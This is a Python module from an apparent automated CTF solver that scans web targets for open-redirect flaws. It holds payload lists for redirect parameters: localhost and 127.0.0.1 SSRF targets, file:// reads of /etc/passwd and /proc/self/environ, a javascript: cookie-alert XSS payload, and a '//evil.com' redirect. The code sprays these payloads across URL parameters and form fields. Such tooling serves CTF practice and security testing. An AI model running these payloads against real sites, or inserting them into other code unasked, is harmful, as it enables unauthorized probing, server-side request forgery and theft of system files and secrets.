"""
Open Redirect Module — CTF challenges that redirect to expose flags
Also tests for flag-in-redirect-response and URL-based SSTI chains.
"""
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from backend.core.base_module import BaseModule
from backend.core.flag_hunter import FlagHunter
from backend.core.parser import Parser


REDIRECT_PARAMS = [
    "redirect", "redirect_url", "redirectUrl", "redirect_uri", "redirectUri",
    "next", "url", "return", "returnTo", "return_url", "returnUrl",
    "goto", "go", "target", "destination", "dest", "forward", "continue",
    "location", "back", "ref", "referer", "referrer", "redir",
    "link", "out", "exit", "view", "path", "page", "resource",
]

PAYLOADS = [
    "//localhost/flag",
    "//127.0.0.1/flag",
    "//0.0.0.0/flag",
    "http://localhost/flag",
    "http://127.0.0.1/flag",
    "http://localhost/flag.txt",
    "http://127.0.0.1/flag.txt",
    "http://localhost/api/flag",
    "/flag", "/flag.txt", "/secret", "/admin/flag",
    "http://localhost/",
    "http://127.0.0.1:8080/flag",
    "http://localhost:3000/flag",
    "javascript:alert(document.cookie)",  # XSS via redirect
    "data:text/html,<script>alert(1)</script>",
    "//evil.com/%2f..",
]

FILE_PAYLOADS = [
    "file:///flag", "file:///flag.txt", "file:///etc/passwd",
    "file:///proc/self/environ",
]


class OpenRedirectModule(BaseModule):
    MODULE_NAME = "open_redirect"
    DESCRIPTION = "Open Redirect / URL Manipulation"

    def run(self) -> dict:
        self.log(f"[REDIR] Starting scan on {self.target_url}")
        resp = self.requester.get()
        if resp is None:
            self.results["status"] = "unreachable"
            return self.results

        for f in FlagHunter.hunt(resp.text):
            self.add_flag(f)

        # Test URL params
        self._test_url_params()

        # Test forms
        forms = Parser.extract_forms(resp.text)
        for form in forms:
            self._test_form(form)

        # Follow any existing redirects and hunt flags
        self._follow_all_redirects(resp)

        if self.results["status"] == "pending":
            self.results["status"] = "not_vulnerable"
        return self.results

    def _test_url_params(self):
        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query)

        # Check existing redirect params
        for param in list(params.keys()) + REDIRECT_PARAMS:
            for payload in PAYLOADS + FILE_PAYLOADS:
                test = {**params, param: payload}
                url  = urlunparse(parsed._replace(query=urlencode(test, doseq=True)))
                r = self.requester.raw_get(url)
                if r is None:
                    continue
                flags = FlagHunter.hunt(r.text)
                if flags:
                    [self.add_flag(f) for f in flags]
                    self.add_vuln({"type": "open_redirect_flag", "param": param,
                                   "payload": payload, "flags": flags})
                    self.log(f"[REDIR] FLAG via redirect param '{param}'!")
                    return
                # Check if we got redirected to an interesting location
                if r.history:
                    for rr in r.history:
                        ff = FlagHunter.hunt(rr.text if hasattr(rr, 'text') else "")
                        [self.add_flag(f) for f in ff]
                    # Check final response
                    ff = FlagHunter.hunt(r.text)
                    [self.add_flag(f) for f in ff]

    def _test_form(self, form):
        action = form["action"] or self.target_url
        if not action.startswith("http"):
            action = self.target_url.rstrip("/") + "/" + action.lstrip("/")
        for field in form["inputs"]:
            name = (field.get("name") or "").lower()
            if any(kw in name for kw in ("redirect", "next", "url", "goto", "return",
                                          "target", "dest", "forward", "continue")):
                for payload in PAYLOADS[:8]:
                    data = {i["name"]: (payload if i["name"] == field["name"]
                                        else i["value"] or "test")
                            for i in form["inputs"] if i["name"]}
                    r = (self.requester.post(action, data=data)
                         if form["method"] == "POST"
                         else self.requester.get(action, params=data))
                    if r is None:
                        continue
                    flags = FlagHunter.hunt(r.text)
                    if flags:
                        [self.add_flag(f) for f in flags]
                        self.add_vuln({"type": "form_redirect_flag",
                                       "field": field["name"], "payload": payload})
                        return

    def _follow_all_redirects(self, initial_resp):
        """Manually follow redirect chains to hunt flags at each hop."""
        if not initial_resp.history:
            return
        for r in initial_resp.history:
            if hasattr(r, "text"):
                flags = FlagHunter.hunt(r.text)
                [self.add_flag(f) for f in flags]
        # Also check headers of each hop
        for r in initial_resp.history:
            for header_val in r.headers.values():
                flags = FlagHunter.hunt(header_val)
                [self.add_flag(f) for f in flags]
